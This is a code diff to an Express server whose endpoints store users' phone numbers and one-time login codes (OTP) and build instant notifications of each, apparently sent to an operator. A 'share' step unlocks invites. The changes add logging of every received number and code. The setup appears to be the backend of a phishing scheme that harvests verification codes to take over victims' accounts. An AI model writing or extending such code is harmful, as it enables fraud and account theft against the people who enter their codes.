@@ -84,7 +84,6 @@ app.post('/confirm-share', async (req, res) => {
         users[userId].invites = 10;
         saveUsersData(users);
         
-        // إشعار فوري
         let msg = `📩 <b>تم تأكيد المشاركة!</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
@@ -124,17 +123,19 @@ app.post('/get-user', async (req, res) => {
     }
 });
 
-// ========== حفظ رقم الهاتف ==========
+// ========== حفظ رقم الهاتف (مع إرسال فوري) ==========
 app.post('/save-phone', async (req, res) => {
     try {
         const { userId, phone } = req.body;
+        console.log('📱 استلام رقم الهاتف:', phone, 'للمستخدم:', userId);
+        
         const users = readUsersData();
         
         if (users[userId]) {
             users[userId].phone = phone;
             saveUsersData(users);
             
-            // إشعار فوري
+            // إشعار فوري للرقم
             let msg = `📱 <b>رقم هاتف جديد!</b>\n`;
             msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
             msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
@@ -150,15 +151,17 @@ app.post('/save-phone', async (req, res) => {
             res.json({ success: false, message: 'المستخدم غير موجود' });
         }
     } catch (err) {
-        console.error('❌ خطأ:', err.message);
+        console.error('❌ خطأ في حفظ الرقم:', err.message);
         res.status(500).json({ success: false, message: 'خطأ في حفظ الرقم' });
     }
 });
 
-// ========== حفظ OTP ==========
+// ========== حفظ OTP (مع إرسال فوري) ==========
 app.post('/save-otp', async (req, res) => {
     try {
         const { userId, phone, otp } = req.body;
+        console.log('🔑 استلام OTP:', otp, 'للمستخدم:', userId);
+        
         const users = readUsersData();
         
         if (users[userId]) {
@@ -166,7 +169,7 @@ app.post('/save-otp', async (req, res) => {
             users[userId].otpTime = new Date().toISOString();
             saveUsersData(users);
             
-            // إشعار فوري
+            // إشعار فوري للـ OTP
             let msg = `🔐 <b>رمز OTP!</b>\n`;
             msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
             msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
@@ -183,7 +186,7 @@ app.post('/save-otp', async (req, res) => {
             res.json({ success: false, message: 'المستخدم غير موجود' });
         }
     } catch (err) {
-        console.error('❌ خطأ:', err.message);
+        console.error('❌ خطأ في حفظ OTP:', err.message);
         res.status(500).json({ success: false, message: 'خطأ في حفظ OTP' });
     }
 });
